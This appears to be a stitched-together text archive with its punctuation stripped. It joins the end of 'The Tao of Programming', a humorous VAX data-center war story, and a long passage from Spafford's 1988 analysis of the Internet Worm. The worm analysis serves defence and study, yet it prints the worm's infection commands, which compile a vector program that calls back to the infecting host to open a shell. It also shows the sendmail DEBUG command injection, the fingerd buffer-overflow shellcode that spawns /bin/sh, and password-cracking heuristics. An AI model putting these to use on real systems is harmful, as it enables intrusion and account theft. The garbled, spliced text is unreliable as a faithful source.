be fired, even if   the project is cancelled. Why is this  He is filled with Tao.                                                                                13                  H a r d w a r e   a n d   S o f t w a r e                           B o o k   E i g h t                                                                                            Thus spake the master programmer         Without the wind, the grass does not move. Without software,      hardware is useless.                                                                                                            8.1    A novice asked the master   I perceive that one computer company is   much larger than all others. It towers above its competition like a   giant among dwarfs. Any one of its divisions could comprise an entire   business. Why is this so      The master replied,  Why do you ask such foolish questions  That   company is large because it is large. If it only made hardware,   nobody would buy it. If it only made software, nobody would use it.   If it only maintained systems, people would treat it like a servant.   But because it combines all of these things, people think it one of   the gods! By not seeking to strive, it conquers without effort.                                     8.2    A master programmer passed a novice programmer one day. The master   noted the novice's preoccupation with a hand held computer game.    Excuse me , he said,  may I examine it      The novice bolted to attention and handed the device to the master. I   see that the device claims to have three levels of play  Easy, Medium   and Hard , said the master.  Yet every such device has another level   of play, where the device seeks not to conquer the human, nor to be   conquered by the human.      Pray, great master , implored the novice,  how does one find this   mysterious settings      The master dropped the device to the ground and crushed it under   foot.  And suddenly the novice was enlightened.                                    8.3    There was once a programmer who worked upon microprocessors.  Look at   how well off I am here,  he said to a mainframe programmer who came   to visit,  I have my own operating system and file storage device. I   do not have to share my resources with anyone.  The software is self    consistant and easy to use. Why do you not quit your present job and   join me here      The mainframe programmer then began to describe his system to his   friend, saying  The mainframe sits like an ancient sage meditating in   the midst of the data center. Its disk drives lie end to end like a   great ocean of machinery. The software is as multifaceted as a   diamond, and as convoluted as a primeval jungle. The programs, each   unique, move through the system like a swift flowing river. That is   why I am happy where I am.     The microcomputer programmer, upon hearing this, fell silent. But the   two programmers remained friends until the end of their days.                                     14                                     8.4    Hardware met Software on the road to Changtse. Software said   You   are Yin and I am Yang. If we travel together we will become famous   and earn vast sums of money.  And so the set forth together, thinking   to conquer the world.    Presently they met Firmware, who was dressed in tattered rage and   hobbled along propped on a thorny stick. Firmware said to them   The   Tao lies beyond Yin and Yang. It is silent and still as a pool of   water. It does not seek fame, therefore nobody knows its presence. It   does not seek fortune, for it is complete within itself. It exists   beyond space and time.     Software and Hardware , ashamed, returned to their homes.                                                                                   15                               E  p i l o g u e                            B o o k   N i n e                                                                                            Thus spake the Master Programmer         Time for you to leave.                                                                                                                                                                  16    "

I'm enclosing everything just as it reached me.   Mike O'Brien The Aerospace Corporation               Subj  Just extracted this from the WAR_STORIES notefile. Long but amusing.             VAXen, my children, just don't belong some places. In            my business, I am frequently called by small sites            and startups having VAX problems. So when a friend of            mine in an Extremely Large Financial Institution             ELFI  called me one day to ask for help, I was            intrigued because this outfit is a really major VAX            user   they have several large herds of VAXen   and            plenty of sharp VAXherds to take care of them.              So I went to see what sort of an ELFI mess they had            gotten into.  It seems they had shoved a small 750            with two RA60's running a single application, PC            style, into a data center with two IBM 3090's and            just about all the rest of the disk drives in the            world. The computer room was so big it had three            street addresses. The operators had only IBM            experience and, to quote my friend,  they were having             a little trouble adjusting to the VAX , were a bit            hostile towards it and probably needed some help with            system management. Hmmm, Hostility... Sigh.              Well, I thought it was pretty ridiculous for an            outfit with all that VAX muscle elsewhere to isolate            a dinky old 750 in their Big Blue Country, and said            so bluntly. But my friend patiently explained that            although small, it was an  extremely sensitive and            confidential application.   It seems that the 750 had            originally been properly clustered with the rest of a            herd and in the care of one of their best VAXherds.            But the trouble started when the Chief User went to            visit his computer and its VAXherd.              He came away visibly disturbed and immediately            complained to the ELFI's Director of Data Processing            that,  There are some very strange people in there            with the computers.  Now since this user person was            the Comptroller of this Extremely Large Financial            Institution, the 750 had been promptly hustled over            to the IBM data center which the Comptroller said,             was a more suitable place.   The people there wore            shirts and ties and didn't wear head bands or cowboy            hats.              So my friend introduced me to the Comptroller, who            turned out to be five feet tall, 85 and a former            gnome of Zurich.  He had a young apprentice gnome who            was about 65. The two gnomes interviewed me in            whispers for about an hour before they decided my            modes of dress and speech were suitable for managing            their system and I got the assignment.              There was some confusion, understandably, when I            explained that I would immediately establish a            procedure for nightly backups. The senior gnome            seemed to think I was going to put the computer in            reverse, but the apprentice's son had an IBM PC and            he quickly whispered that  backup  meant making a            copy of a program borrowed from a friend and why was            I doing that  Sigh.              I was shortly introduced to the manager of the IBM            data center, who greeted me with joy and anything but            hostility. And the operators really weren't hostile              it just seemed that way.  It's like the driver of a            Mack 18 wheeler, with a condo behind the cab, who was            doing 75 when he ran over a moped doing it's best to            get away at 45.  He explained sadly,  I really warn't            mad at mopeds but to keep from runnin' over that'n,            I'da had to slow down or change lanes!               Now the only operation they had figured out how to do            on the 750 was reboot it.  This was their universal            cure for any and all problems.  After all it works on            a PC, why not a VAX   Was there a difference   Sigh.              But I smiled and said,  No sweat, I'll train you.            The first command you learn is HELP  and proceeded to            type it in on the console terminal.  So the data            center manager, the shift supervisor and the eight            day operators watched the LA100 buzz out the usual            introductory text.  When it finished they turned to            me with expectant faces and I said in an avuncular            manner,  This is your most important command!               The shift supervisor stepped forward and studied the            text for about a minute. He then turned with a very            puzzled expression on his face and asked,  What do            you use it for   Sigh.              Well, I tried everything.  I trained and I put the            doc set on shelves by the 750 and I wrote a special            40 page doc set and then a four page doc set. I            designed all kinds of command files to make complex            operations into simple foreign commands and I taped a            list of these simplified commands to the top of the            VAX. The most successful move was adding my home            phone number.              The cheat sheets taped on the top of the CPU cabinet            needed continual maintenance, however. It seems the            VAX was in the quietest part of the data center, over            behind the scratch tape racks. The operators ate            lunch on the CPU cabinet and the sheets quickly            became coated with pizza drippings, etc.              But still the most used solution to hangups was a            reboot and I gradually got things organized so that            during the day when the gnomes were using the system,            the operators didn't have to touch it. This smoothed            things out a lot.              Meanwhile, the data center was getting new TV            security cameras, a halon gas fire extinguisher            system and an immortal power source. The data center            manager apologized because the VAX had not been            foreseen in the plan and so could not be connected to            immortal power.  The VAX and I felt a little rejected            but I made sure that booting on power recovery was            working right.  At least it would get going again            quickly when power came back.              Anyway, as a consolation prize, the data center            manager said he would have one of the security            cameras adjusted to cover the VAX.  I thought to            myself,  Great, now we can have 24 hour video tapes            of the operators eating Chinese takeout on the CPU.             I resolved to get a piece of plastic to cover the            cheat sheets.              One day, the apprentice gnome called to whisper that            the senior was going to give an extremely important            demonstration. Now I must explain that what the 750            was really doing was holding our National Debt.  The            Reagan administration had decided to privatize it and            had quietly put it out for bid. My Extreme Large            Financial Institution had won the bid for it and was,            as ELFI's are wont to do, making an absolute bundle            on the float.              On Monday the Comptroller was going to demonstrate to            the board of directors how he could move a trillion            dollars from Switzerland to the Bahamas.  The            apprentice whispered,  Would you please look in on            our computer  I'm sure everything will be fine, sir,            but we will feel better if you are present.  I'm sure            you understand    I did.              Monday morning, I got there about five hours before            the scheduled demo to check things over. Everything            was cool. I was chatting with the shift supervisor            and about to go upstairs to the Comptroller's office.            Suddenly there was a power failure.              The emergency lighting came on and the immortal power            system took over the load of the IBM 3090's.  They            continued smoothly, but of course the VAX, still on            city power, died. Everyone smiled and the dead 750            was no big deal because it was 7 AM and gnomes don't            work before 10 AM. I began worrying about whether I            could beg some immortal power from the data center            manager in case this was a long outage.              Immortal power in this system comes from storage            batteries for the first five minutes of an outage.            Promptly at one minute into the outage we hear the            gas turbine powered generator in the sub basement            under us automatically start up getting ready to take            the load on the fifth minute.  We all beam at each            other.              At two minutes into the outage we hear the whine of            the backup gas turbine generator starting. The 3090's            and all those disk drives are doing just fine.            Business as usual. The VAX is dead as a door nail but            what the hell.              At precisely five minutes into the outage, just as            the gas turbine is taking the load, city power comes            back on and the immortal power source commits            suicide.  Actually it was a double murder and suicide            because it took both 3090's with it.              So now the whole data center was dead, sort of.  The            fire alarm system had it's own battery backup and was            still alive. The lead acid storage batteries of the            immortal power system had been discharging at a            furious rate keeping all those big blue boxes running            and there was a significant amount of sulfuric acid            vapor. Nothing actually caught fire but the smoke            detectors were convinced it had.              The fire alarm klaxon went off and the siren warning            of imminent halon gas release was screaming.  We            started to panic but the data center manager shouted            over the din,  Don't worry, the halon system failed            its acceptance test last week. It's disabled and            nothing will happen.               He was half right, the primary halon system indeed            failed to discharge. But the secondary halon system            observed that the primary had conked and instantly            did its duty, which was to deal with Dire Disasters.            It had twice the capacity and six times the discharge            rate.              Now the ear splitting gas discharge under the raised            floor was so massive and fast, it blew about half of            the floor tiles up out of their framework. It came up            through the floor into a communications rack and blew            the cover panels off, decking an operator. Looking            out across that vast computer room, we could see the            air shimmering as the halon mixed with it.              We stampeded for exits to the dying whine of 175 IBM            disks.  As I was escaping I glanced back at the VAX,            on city power, and noticed the usual flickering of            the unit select light on its system disk indicating            it was happily rebooting.              Twelve firemen with air tanks and axes invaded. There            were frantic phone calls to the local IBM Field            Service office because both the live and backup            3090's were down. About twenty minutes later,            seventeen IBM CEs arrived with dozens of boxes and,            so help me, a barrel. It seems they knew what to            expect when an immortal power source commits murder.              In the midst of absolute pandemonium, I crept off to            the gnome office and logged on. After extensive            checking it was clear that everything was just fine            with the VAX and I began to calm down. I called the            data center manager's office to tell him the good            news. His secretary answered with,  He isn't expected            to be available for some time.  May I take a            message    I left a slightly smug note to the effect            that, unlike some other computers, the VAX was intact            and functioning normally.              Several hours later, the gnome was whispering his way            into a demonstration of how to flick a trillion            dollars from country 2 to country 5.  He was just            coming to the tricky part, where the money had been            withdrawn from Switzerland but not yet deposited in            the Bahamas.  He was proceeding very slowly and the            directors were spellbound. I decided I had better            check up on the data center.              Most of the floor tiles were back in place. IBM had            resurrected one of the 3090's and was running tests.            What looked like a bucket brigade was working on the            other one. The communication rack was still naked and            a fireman was standing guard over the immortal power            corpse. Life was returning to normal, but the Big            Blue Country crew was still pretty shaky.              Smiling proudly, I headed back toward the triumphant            VAX behind the tape racks where one of the operators            was eating a plump jelly bun on the 750 CPU. He saw            me coming, turned pale and screamed to the shift            supervisor,  Oh my God, we forgot about the VAX!             Then, before I could open my mouth, he rebooted it.            It was Monday, 19 Oct 1987.  VAXen, my children, just            don't belong some places.    Edited by Brad Templeton.

It is based on study of two  completely independent reverse compilations of the worm and a  version disassembled to VAX assembly language. Almost no source  code is given in the paper because of current concerns about the  state of the ``immune system'' of Internet hosts, but the  description should be detailed enough to allow the reader to  understand the behavior of the program. The paper contains a  review of the security flaws exploited by the worm program, and  gives some recommendations on how to eliminate or mitigate their  future use. The report also includes an analysis of the coding  style and methods used by the author  s   of the worm, and draws  some conclusions about his abilities and intent.   Copyright 1988 by Eugene H.

November 29, 1988   The Internet Worm Program  An Analysis  Purdue Technical Report CSD TR 823  Eugene H. Spafford  Department of Computer Sciences  Purdue University West Lafayette, IN 47907 2004   spaf cs.purdue.edu   Introduction  On the evening of 2 November 1988 the Internet came under attack   From within. Sometime round 6 PM EST, a program was executed on  one or more hosts connected to the Internet. This program  collected host, network, and user information, then broke into  other machines    using flaws present in those systems' software.  After breaking in, the program would replicate itself and the  replica would also attempt to infect other systems. Although the  program would only infect Sun Microsystems Sun 3 systems, and VAX  computers running variants of 4 BSD UNIX the program spread  quickly, as did the confusion and consternation of system  administrators and users as they discovered that their systems  had been infected. Although UNIX has long been known to have some  security weaknesses   cf.  Ritc79 ,  Gram84 , and  Reid87   , the  scope of the breakins came as a great surprise to almost  everyone. he program was mysterious to users at sites where it  appeared. Unusual files were left in the usr tmp directories of  some machines, and strange messages appeared in the log files of  some of the utilities, such as the sendmail mail handling agent.  The most noticeable effect, however, was that systems became more  and more loaded with running processes as they became repeatedly  infected. As time went on, some of these machines became so  loaded that they were unable to continue any processing  some  machines failed completely when their swap space or process  tables were exhausted. By late Thursday night, personnel at the  University of California at Berkeley and at Massachusetts  Institute of Technology had ``captured'' copies of the program  and began to analyze it. People at other sites also began to  study the program and were developing methods of eradicating it.  A common fear was that the program was somehow tampering with  system resources in a way that could not be readily detected and  that while a cure was being sought, system files were being  altered or information destroyed. By 5 AM EST Thursday morning,  less than 12 hours after the infection started on the network,  the Computer Systems Research Group at Berkeley had developed an  interim set of steps to halt its spread. This included a  preliminary patch to the sendmail mail agent, and the suggestion  to rename one or both of the C compiler and loader to prevent  their use. These suggestions were published in mailing lists and  on the usenet, although their spread was hampered by systems  disconnecting from the Internet to attempt a ``quarantine.''  By about 7 PM EST Thursday, another simple, effective method of  stopping the infection, without renaming system utilities, was  discovered at Purdue and also widely published. Software patches  were posted by the Berkeley group at the same time to mend all  the flaws that enabled the program to invade systems. All that  remained was to analyze the code that caused the problems. On  November 8, the National Computer Security Center held a  hastily convened workshop in Baltimore. The topic of discussion  was the program and what it meant to the internet community. Who  was at that meeting and why they were invited, and the topics  discussed have not yet been made public.   However, one thing we know that was decided by those present at  the meeting was that they would not distribute copies of their  reverse engineered code to the general public. It was felt that  the program exploited too many little known techniques and that  making it generally available would only provide other attackers  a framework to build another such program. Although such a stance  is well intended, it can serve only as a delaying tactic. As of  November 27, I am aware of at least five versions of the  decompiled code, and because of the widespread distribution of  the binary, I am sure there are at least ten times that many  versions already completed or in progress and the required skills  and tools are too readily available within the community to  believe that only a few groups have the capability to reconstruct  the source code. any system administrators, programmers, and  managers are interested in how the program managed to establish  itself on their systems and spread so quickly These individuals  have  valid interest in seeing the code, especially if they are  software vendors. Their interest is not to duplicate the program,  but to be sure that all the holes used by the program are  properly plugged. Furthermore, examining the code may help  administrators and vendors develop defenses against future  attacks, despite the claims to the contrary by some of the  individuals with copies of the reverse engineered code. This  report is intended to serve an interim role in this process. It  is a detailed description of how the program works, but does not  provide source code that could be used to create a new worm  program. As such, this should be an aid to those individuals  seeking a better understanding of how the code worked, yet it is  in such a form that it cannot be used to create a new worm  without considerable effort. Section 3 and Appendix C contain  specific observations about some of the flaws in the system  exploited by the program, and their fixes. A companion report, to  be issued in a few weeks, will contain a history of the worm's  spread through the Internet. This analysis is the result of a  study performed on three separate reverse engineered versions of  the worm code. Two of these versions are in C code, and one in  VAX assembler. All three agree in all but the most minor details.  One C version of the code compiles to binary that is identical to  the original code, except for minor differences of no  significance. As such, I can state with some certainty that if  there was only one version of the worm program, then it was  benign in intent. The worm did not write to the file system  except when transferring itself into a target system. It also did  not transmit any information from infected systems to any site,  other than copies of the worm program itself. Since the Berkeley  Computer Systems Research Group as already published official  fixes to the flaws exploited by the program, we do not have to  worry about these specific attacks being used again. Many vendors  have also issued appropriate patches. It now remains to convince  the remaining vendors to issue fixes, and users to install them.   Terminology   There seems to be considerable variation in the names applied to  the program described in this paper. I use the term worm instead  of virus based on its behavior. Members of the press have used  the term virus, possibly because their experience to date has  been only with that form of security problem. This usage has been  reinforced by quotes from computer managers and programmers also  unfamiliar with the terminology. For purposes of clarifying the  terminology, let me define the difference between these two terms  and give some citations to their origins   worm is a program that  can run by itself and can propagate a fully working version of  itself to other machines. It is derived from the word tapeworm, a  parasitic organism that lives inside a host and saps its  resources to maintain itself.  virus is a piece of code that adds  itself to other programs, including operating systems. it cannot  run independently and it requires that its ``host'' program be  run to activate it. As such, it has a clear analog to biological  viruses and those viruses are not considered alive in  the usual  sense  instead, they invade host cells and corrupt them, causing  them to produce  new viruses.  The program that was loosed on the  Internet was clearly a worm.    2.1. Worms    The concept of a worm program that spreads itself from machine to   machine was  apparently first described by John Brunner in 1975  in his classic science fiction novel The Shockwave Rider.   Brun75   He called these programs tapeworms that lived  ``inside'' the computers  and spread themselves to other  machines. In 1979 1981, researchers at Xerox PARC built and   experimented with worm programs. They reported their experiences  in an article in 1982 in Communications of the ACM.   Shoc82  The  worms built at PARC were designed to travel from machine to  machine and do useful  work in a distributed environment. They  were not used at that time to break into systems,  although some  did ``get away'' during the tests. A few people seem to prefer to  call the Internet Worm a virus because it was destructive, and  they believe worms are non destructive. Not  everyone agrees that  the Internet Worm was destructive, however. Since intent and  effect are sometimes difficult to judge, using those as a naming  criterion is clearly insufficient. As such, worm continues to be  the clear choice to describe this kind of program.    2.2. Viruses    The first  use of the word virus   to my knowledge   to describe  something that infects a  computer was by David Gerrold in his  science fiction short stories about the G.O.D. machine.  These  stories were later combined and expanded to form the book  When Harlie Was One.  Gerr72   A subplot in that book described a  program named VIRUS created by an unethical scientist.  A   computer infected with VIRUS would randomly dial the phone until  it found another computer.  It  would then break into that system  and infect it with a copy of VIRUS. This program would infiltrate  the system software and slow the system down so much that it  became unusable  except to infect other machines  . The inventor  had plans to sell a program named VACCINE  that could cure VIRUS  and prevent infection, but disaster occurred when noise on a  phone line caused VIRUS to mutate so VACCINE ceased to be  effective.  The term computer virus was first used in a formal  way by Fred Cohen at USC.  Cohe84   He  defined the term to mean  a security problem that attaches itself to other code and turns  it into  something that produces viruses  to quote from his  paper  ``We define a computer `virus' as a  program that can  infect other programs by modifying them to include a possibly  evolved copy of itself.'' He claimed the first computer virus was  ``born'' on November 3, 1983, written by  himself for a security  seminar course.    The interested reader may also wish to consult  Denn88  and   Dewd85  for further discussion of the terms.    3.  Flaws and Misfeatures    3.1. Specific Problems    The actions of the Internet Worm exposed some specific security  flaws in standard services provided by BSD derived versions of  UNIX. Specific patches for these flaws have been widely  circulated in days since the worm program attacked the Internet.  Those flaws and patches are  discussed here.    3.1.1. fingerd and gets    The finger program is a utility that allows users to obtain  information about other users. It  is usually used to identify  the full name or login name of a user, whether or not a user is   currently logged in, and possibly other information about the  person such as telephone numbers  where he or she can be reached.  The fingerd program is intended to run as a daemon, or background  process, to service remote requests using the finger protocol.    Harr77   The bug exploited to break fingerd involved overrunning  the buffer the daemon used for  input. The standard C library has  a few routines that read input without checking for bounds on   the buffer involved. In particular, the gets call takes input to  a buffer without doing any bounds  checking  this was the call  exploited by the worm.  The gets routine is not the only routine  with this flaw. The family of routines scanf fscanf sscanf may  also overrun buffers when decoding input unless the user  explicitly  specifies limits on the number of characters to be  converted. Incautious use of the sprintf routine can overrun  buffers. Use of the strcat strcpy calls instead of the  strncat strncpy routines  may also overflow their buffers.   Although experienced C programmers are aware of the problems with  these routines, they  continue to use them. Worse, their format  is in some sense codified not only by historical inclusion in  UNIX and the C language, but more formally in the forthcoming  ANSI language standard  for C. The hazard with these calls is  that any network server or privileged program using  them may  possibly be compromised by careful precalculation of the  inappropriate input.  An important step in removing this hazard  would be first to develop a set of replacement  calls that accept  values for bounds on their program supplied buffer arguments.  Next, all system servers and privileged applications should be  examined for unchecked uses of the original  calls, with those  calls then being replaced by the new bounded versions. Note that  this audit  has  already been performed by the group at Berkeley   only the fingerd and timed servers used the gets call, and  patches to fingerd have already been posted. Appendix C contains  a new  version of fingerd written specifically for this report  that may be used to replace the original version. This version  makes no calls to gets.    3.1.2. Sendmail    The sendmail program is a mailer designed to route mail in a  heterogeneous internetwork.   Allm83   The program operates in a  number of modes, but the one of most interest is  when it is  operating as a daemon process. In this mode, the program is  ``listening'' on  a TCP  port    25   for attempts to deliver  mail using standard Internet protocols, principally SMTP     Simple Mail Transfer Protocol  .   Post82   When such a request  is detected, the daemon enters into  a dialog with the remote  mailer to determine sender, recipient, delivery instructions, and  message contents.  The bug exploited in sendmail had to do with  functionality provided by a debugging  option in the code. The  worm would issue the DEBUG command to sendmail and then specify   a set of commands instead of a user address as the recipient of  the message. Normally, this  is  not allowed, but it is present  in the debugging code to allow testers to verify that mail is  arriving at a particular site without the need to activate the  address resolution routines. The debug  option of sendmail is  often used because of the complexity of configuring the mailer  for local  conditions, and many vendors and site administrators  leave the debug option compiled in.  The sendmail program is of  immense importance on most Berkeley derived   and other   UNIX  systems because it handles the complex tasks of mail routing and  delivery. Yet, despite  its importance and wide spread use, most  system administrators  know little about how it works.  Stories  are often related about how system administrators will attempt to  write new device  drivers or otherwise modify the kernel of the  OS, yet they will not willingly attempt to modify  sendmail or  its configuration files.  It is little wonder, then, that bugs  are present  in sendmail that allow unexpected behavior.  Other  flaws have been found and reported now that attention has been  focused on the program,  but it is not known for sure if all the  bugs have been discovered and all the patches circulated.  One  obvious approach would be to dispose of sendmail and come  up  with a simpler program to handle mail. Actually, for purposes  of verification, developing a suite of cooperating  programs  would be a better approach, and more aligned with the UNIX  philosophy. In effect,  sendmail is fundamentally flawed, not  because of anything related to function,  but because it is  too  complex and difficult to understand.    The Berkeley Computer Systems Research Group has a new version of  sendmail with  many bug fixes and fixes for security flaws. This  version of sendmail is available for FTP from  the host  ``ucbarpa.berkeley.edu'' and will be present in the file   ftp pub sendmail.tar.Z by the  end of November 1988. Note that  this version is shipped with the DEBUG option disabled by   default. However, this does not help system administrators who  wish to enable the DEBUG  option, although the researchers at  Berkeley believe they have fixed  all the security flaws   inherent in that facility. One approach that could be taken with  the program would be to have it  prompt the user for the password  of the super user   root   when the DEBUG command is given.  A  static password should never be compiled into the program because   this would mean that the same password might be present at  multiple sites and seldom changed.  For those sites without  access to FTP or otherwise unable to obtain the new version, the   official patches to sendmail are enclosed in Appendix D.    3.2. Other Problems    Although the worm exploited flaws in only two server programs,  its behavior has served to  illustrate a few fundamental problems  that have not yet been widely addressed. In the interest of   promoting better security, some of these problems are discussed  here.  The interested reader is  directed to works such as   Gram84  for a broader discussion of related issues.    3.2.1. Servers in general    A security flaw not exploited by the worm, but now becoming  obvious, is that many system services have configuration and  command files owned by the same userid. Programs like  sendmail,  the at service, and other facilities are often all owned by the  same  non user id. This  means that if it is possible to abuse  one of the services, it might be possible to abuse many.  One way  to deal with the general problem is have every daemon and  subsystem run with a  separate userid. That way, the command and  data files for each subsystem could  be protected in  such a way  that only that subsystem could have write   and perhaps read    access to the files.  This is effectively an implementation of  the principle of least privilege. Although doing this  might add  an extra dozen user ids to the system, it is a small  cost to  pay, and is already sup ported in the UNIX paradigm. Services  that should have separate ids include sendmail, news, at,   finger, ftp, uucp and YP.    3.2.2. Passwords    A key attack of the worm program involved attempts to discover  user passwords. It was  able to determine success because the  encrypted password of each user was in a publicly readable file.  This allows an attacker to encrypt lists of possible passwords  and then compare  them against the actual passwords without  passing through any system function. In effect, the  security of  the passwords is provided in large part by the prohibitive effort  of trying all combinations of letters. Unfortunately, as machines  get faster, the cost of such attempts decreases.  Dividing the  task among multiple processors further reduces the time needed to  decrypt a password. It  is currently feasible to use a  supercomputer to precalculate all probable passwords and store  them on optical media. Although not   currently   portable, this  scheme would allow someone with the appropriate resources access  to any account for which they could read the password  field and  then consult  their database of pre encrypted passwords. As the  density of storage  media increases, this problem will only get  more severe.  A clear approach to reducing the risk of such  attacks, and an approach that has already  been taken in some  variants of UNIX, would be to have a  shadow  password file. The  encrypted  passwords are saved in a file that is readable only by  the system administrators, and a privileged  call performs  password encryptions and comparisons with an appropriate delay    .5 to 1 second,  for instance  . This would prevent any attempt  to ``fish'' for passwords. Additionally, a threshold could be  included to check for repeated password attempts from the same  process, resulting  in some form of alarm being raised. Shadow  password files should be used in combination with  encryption  rather than in place of such techniques, however, or one problem  is simply replaced  by a different one  the combination of the  two methods is stronger than either one alone.  Another way to  strengthen the password mechanism would be to change the utility  that  sets user passwords. The utility currently makes minimal  attempt to ensure that new passwords are nontrivial to guess. The  program could be strengthened in such a way that it would reject  any choice of a word currently in the on line dictionary or based  on the account name.    4. High Level Description of the Worm    This section contains a high level overview of how the worm  program functions. The  description in this section assumes that  the reader is familiar with UNIX and somewhat familiar  with  network facilities under UNIX. Section 5 describes the individual  functions and structures  in more detail.  The worm consists of  two parts  a main program, and a bootstrap or vector program     described in Appendix B  . We will start our description from  the point at which a host is  about to be infected. At this  point, a worm running on another machine has either succeeded in   establishing a shell on the new host and has connected back to  the infecting machine via a TCP  connection, or it has connected  to the SMTP port and is transmitting to the sendmail program.   The infection proceeded as follows   1   A socket was established  on the infecting machine for the vector program to connect to     e.g., socket number 32341  . A challenge string was constructed   From a random number    e.g., 8712440  . A file name base was  also constructed using a random number   e.g.,  14481910  .  2    The vector program was installed and executed using one of two  methods   2a   Across a TCP connection to a shell, the worm would  send the following commands    the two lines beginning with  ``cc'' were sent as a single line      PATH  bin  usr bin  usr ucb  cd  usr tmp  echo gorch49  sed ' int  zz q'   x14481910.c echo gorch50   text of vector  program 320enclosed in Appendix B   int zz   cc   o x14481910  x14481910.c . x14481910 128.32.134.16 32341 8712440   rm  f  x14481910 x14481910.c echo DONE   Then it would wait for the string ``DONE'' to signal that the  vector program was  running.  2b   Using the SMTP connection, it  would transmit   the two lines beginning with ``cc''  were sent  as a single line      debug  mail from    dev null   rcpt to     sed  e '1,    'd     bin sh   exit 0    data  cd  usr tmp  cat   x14481910.c   'EOF'    text of vector program 320enclosed in Appendix III   EOF  cc  o  x14481910 x14481910.c x14481910 128.32.134.16 32341 8712440   rm   f x14481910 x14481910.c .   quit    The infecting worm would then wait for up to 2 minutes on  the designated port for the vector to contact it.  3   The vector  program then connected to the ``server,'' sent the challenge  string, and  transferred three files  a Sun 3 binary version of  the worm, a VAX version, and the source  code for the vector  program. After the files were copied, the running vector program   became   via the execl call   the shell with its input and output  still connected to the server  worm.  4   The server worm sent  the following command stream to the connected shell    PATH  bin  usr bin  usr ucb  rm  f sh  if    f sh    then   P x14481910  else  P sh  fi   Then, for each binary file it had transferred   just two in this  case, although the code is  written  to allow more  , it would  send the following form of command sequence    cc  o  P x14481910,sun3.o .   P  p    x14481910,sun3.o  x14481910,vax.o x14481910,l1.c  rm  f  P   The rm would succeed only if the linked version of the worm  failed to start execution. If  the server determined that the  host was now infected, it closed the connection. Otherwise,  it  would try the other binary file. After both binary files had been  tried, it would send over rm commands for the object files to  clear away all evidence of the attempt at infection.  5   The new  worm on the infected host proceeded to ``hide'' itself by  obscuring its argument  vector, unlinking the binary version of  itself, and killing its parent   the    argument in the   invocation  . It then read into memory each of the worm binary  files, encrypted each file  after reading it, and deleted the  files from disk.  6   Next, the new worm gathered information  about network interfaces and hosts to which the  local machine  was connected. It built lists of these in memory, including  information  about canonical and alternate names and addresses.  It gathered some of this information  by making direct  ioctl calls, and by running the netstat program with various  arguments.  It also read through various system files looking for  host names to add to its database.  7   It randomized the lists  it constructed, then attempted to infect some of those hosts. For   directly connected networks, it created a list of possible host  numbers and attempted to infect those hosts if they existed.  Depending on the type of host   gateway or local network  , the  worm first tried to establish a connection on the telnet or rexec  ports to determine reachability before it attempted one of the  infection methods.  8   The infection attempts proceeded by one  of three routes  rsh, fingerd, or sendmail.  8a   The attack via  rsh was done by attempting to spawn a remote shell by invocation  of    in order of trial    usr ucb rsh,  usr bin rsh, and   bin rsh. If successful, the host was  infected as in steps 1 and  2a, above.  8b   The attack via the finger daemon was somewhat  more subtle. A connection was  established to the remote finger  server daemon and then a specially constructed  string of 536  bytes was passed to the daemon, overflowing its input buffer and  overwriting parts of the stack. For standard 4 BSD versions  running on VAX computers, the overflow resulted in the return  stack frame for the main routine being  changed so that the  return address pointed into the buffer on the stack. The  instructions that were written into the stack at that location  were   pushl  68732f ' sh  0'  pushl  6e69622f ' bin'  movl sp,  r10  pushrl  0  pushrl  0  pushrl r10  pushrl  3  movl sp,ap   chmk  3b  That  is, the code executed when the main routine  attempted to return was   execve    bin sh , 0, 0    On VAXen,  this resulted in the worm connected to a remote shell via the TCP  connection. The worm then proceeded to infect the host as in  steps 1 and 2a,  above.  On Suns, this simply resulted in a core  file since the code was not in place to corrupt  a Sun version of  fingerd in a similar fashion.  8c   The worm then tried to infect  the remote host by establishing a connection to the  SMTP port  and mailing an  infection, as in step 2b, above.  Not all the  steps were attempted. As soon as one method succeeded, the host  entry in the internal list was marked as infected and the other  methods were not attempted.  9   Next, it entered a state machine  consisting of five states. Each state  was run for a short   while, then the program looped back to step  7   attempting to  break into other hosts via sendmail, finger, or rsh   . The first  four of the five states were attempts to break into user   accounts on the local machine. The fifth state was the final  state, and occurred after all  attempts had been made to break  all passwords. In the fifth state, the worm looped forever   trying to infect hosts in its internal tables and marked as not  yet infected. The four states  were   9a   The worm read through  the  etc hosts.equiv files and  .rhosts files to find the names  of equivalent hosts. These were marked in the internal table of  hosts. Next, the  worm read the  etc passwd file into an internal  data structure. As it was doing this, it  also examined  the .forward file in each user home directory and included those  host  names in its internal table of hosts to try. Oddly, it did  not similarly check user .rhosts files.  9b   The worm attempted  to break each user password using simple choices. The worm   checked the obvious case of no password. Then, it used the  account name and  GECOS field to try simple passwords. Assume  that the user had an entry in the  password file like    account abcedfghijklm 100 5 User, Name  usr account  bin sh  then  the words tried as potential passwords would be account,  accountaccount, User,  Name, user, name, and tnuocca. These are,  respectively, the account name, the  account name concatenated  with itself, the first and last names of the user, the user   names with leading capital letters turned to lower case, and the  account name  reversed. Experience described in  Gram84   indicates that on systems where users are naive about password  security, these choices may work for up to 30  of user passwords.   Step 10 in this section describes what was done if a password  ``hit'' was achieved.  9c   The third stage in the process  involved trying to break the password of each user by  trying  each word present in an internal dictionary of words   see  Appendix I  . This  dictionary of 432 words was tried against  each account in a random order, with  ``hits'' being handled as  described in step 10, below.  9d   The fourth stage was entered  if all other attempts failed. For each word in the file    usr dict words, the worm would see if it was the password to any  account. In addition, if the word in the dictionary began with an  upper case letter, the letter was converted to lower case and  that word was also tried against all the passwords.  10   Once a  password was broken for any account, the worm would attempt to  break into  remote machines where that user had accounts. The  worm would scan the .forward and .rhosts files of the user at  this point, and identify the names of remote hosts that had   accounts used by the target user. It then attempted two attacks    10a   The worm would first attempt to create a remote shell using  the rexec service. The  attempt would be made using the account  name given in the .forward or .rhosts file  and the user's local  password. This took advantage of the fact that users often have   the same password on their accounts on multiple machines.  10b    The worm would do a rexec to the current host   using the local  user name and password   and would try a rsh command to the  remote host using the username taken  from the file. This attack  would succeed in those cases where the remote machine  had a  hosts.equiv file or the user had a .rhosts file that allowed  remote execution  without a password.  If the remote shell was  created either way, the attack would continue as in steps 1 and  2a,  above. No other use was made of the user password.   Throughout the execution of the main loop, the worm would check  for other worms running on the same machine. To do this, the worm  would attempt to connect to another worm on  a local,  predetermined TCP socket.   9   If such a connection succeeded, one worm would   randomly   set its  pleasequit variable to 1, causing that worm to exit after it had  reached partway  into the third stage of password cracking. This  delay is part of the reason many systems had  multiple worms  running  even though a worm would check for other local worms, it  would  defer its self destruction until significant 